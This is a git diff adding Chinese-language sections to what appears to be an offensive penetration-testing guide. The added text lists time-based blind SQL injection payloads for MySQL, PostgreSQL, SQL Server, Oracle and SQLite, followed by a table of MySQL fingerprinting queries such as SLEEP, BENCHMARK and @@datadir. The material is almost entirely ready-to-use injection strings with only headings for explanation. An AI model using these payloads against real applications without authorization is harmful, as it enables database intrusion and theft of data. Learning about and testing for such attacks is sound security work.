@@ -48,3 +48,56 @@ SQL语句：
 逻辑运算字典：
 
 [sql_logic](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/sqli-logic.txt)
+
+(3)时间盲注
+
+MySQL：
+
+```sql
+1' + sleep(5)
+1' and sleep(5)
+1' && sleep(5)
+1' | sleep(5)
+```
+
+PostgreSQL:
+
+```sql
+1' and pg_sleep(5)
+1' || pg_sleep(5)
+```
+
+SQL Server:
+
+```sql
+1' WAITFOR DELAY '0:0:5'
+1' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT (SELECT SLEEP(5)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=CHAR(109,97,115,116,101,114)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
+```
+
+Oracle:
+
+```sql
+1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',5)
+1' AND DBMS_LOCK.SLEEP(5)
+```
+
+SQLite:
+
+```sql
+1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+```
+
+#### 2.DBMS识别
+
+MySQL识别：
+|描述|查询语句|
+|----|----|
+|睡眠|id=1'-SLEEP(1)=0 LIMIT 1 --|
+|BENCHMARK|id=1'-BENCHMARK(5000000, ENCODE('Slow Down','by 5 seconds'))=0 LIMIT 1 --|
+|字符串拼接|id=' 'mysql' –<br>'my' 'sql'<br>CONCAT('my','sql')|
+|函数|connection_id() --<br>row_count() --<br>POW(1,1) --|
+|错误信息|id='|
+|默认变量|@@version_compile_os<br>@@version<br>@@basedir<br>@@datadir|
+|比较函数|conv('a',16,2)=conv('a',16,2)<br>connection_id()=connection_id()<br>crc32('MySQL')=crc32('MySQL')|
